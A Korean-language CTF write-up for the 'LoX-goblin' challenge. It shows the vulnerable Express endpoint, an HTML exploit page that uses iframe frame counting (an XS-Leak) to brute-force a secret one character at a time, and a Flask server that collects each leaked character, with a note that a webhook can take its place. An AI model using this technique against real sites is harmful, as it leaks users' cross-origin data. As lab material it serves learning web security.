# LoX-goblin

# Usage

# Concept
- XSleak

# Writeup

### app.js
문제 코드입니다.
```js
const isLocal = () => (req, res, next) => (req.connection.remoteAddress === '::ffff:127.0.0.1'|| req.connection.remoteAddress === '::1') 
    ? next() 
    : res.status(403).send('Only LOCAL is allowed');

app.get('/', (req, res) => {
    res.send('hello!!');
});

// isLocal()
app.get('/flag',isLocal(),(req, res) => {
    if (!('flag' in req.query))
        return res.status(200).send('give me flag');

    let flag = req.query.flag;

    if (typeof flag !== 'string')
        return res.status(200).send('give me string type');

    for (let i = 0; i < flag.length; i++) {
        if (flag.charCodeAt(i) < 32 || flag.charCodeAt(i) > 127) {
            return res.status(200).send('plz ascii');
        }
    }

    if (FLAG.startsWith(flag)) {
        res.status(200).send('good try');
    } else {
        res.status(200).send(`<iframe id="goblin"></iframe>`);
    }
});

```
flag엔드포인트는 로컬만 접속이 가능합니다. flag엔드포인트에서 flag쿼리의 값이 실제 FLAG로 시작하면 good try문자열 반환하고 아니면 iframe을 반환합니다. iframe으로 창안에 frame 개수를 확인 할 수 있기 때문에(sop를 무시할 수 있음) frame개수를 확인하여 flag를 얻을 수 있습니다.
Frame Counting이란 XSleak기법입니다.


#### index.html
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <iframe id="iframe"></iframe>
    <script>
        const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
        const FLAG_START = '{{ flag }}';

        const request = async (url) => {
            return new Promise((resolve, reject) => {
                const iframe = document.getElementById("iframe");
                iframe.src = url;
                iframe.onload = () => iframe.contentWindow.frames.length === 0 ? resolve() : reject();
            });
        }

        const leak = async (query) => {
            try {
                await request(`http://localhost/flag?flag=${query}`);
                return true;
            } catch (e) {
                return false;
            }
        }

        const exploit = async () => {
            let flag = FLAG_START;
            while (!flag.includes("}")) {
                for (let char of ALPHABET) {
                    if (await leak(flag + char)) {
                        flag += char;
                        await fetch('/addFLAG?flag=' + char);
                        break;
                    }
                }
            }
        }

        exploit();
    </script>
</body>
</html>
```
#### solv.py
```py
from flask import Flask, request, render_template

flag = "hspace{"
app = Flask(__name__)

@app.route('/solv')
def solv():
    return render_template('index.html',flag=flag)

@app.route('/addFLAG')
def addFLAG():
    global flag
    
    if 'flag' in request.args:
        flag += request.args['flag']
        print(flag)
        return 'added'
    return 'no flag'


@app.route('/getFlag')
def getFlag():
    return flag


if __name__ == '__main__':
    app.run('0.0.0.0', port=30000)
```
솔버 코드입니다. frame개수가 0일때 FLAG를 얻습니다. 
저같은 경우 window에서 wsl말고 flask로 익스플로잇을 했습니다.(서버가 필요하기에 포트포워딩을 해줘야합니다.) 물론 github.io를 이용해서 구할 수도 있습니다. fetch('/addFLAG?flag=' + char)이 코드에 /addFLAG 이 부분을 웹훅사이트로 교체하면 됩니당. 
봇이 url을 60초 동안 방문하기 때문에 한번에 leak이 가능합니다. 익스플로잇을 돌리면 대략 15초 정도안에 flag를 다 구할 수 있습니다.


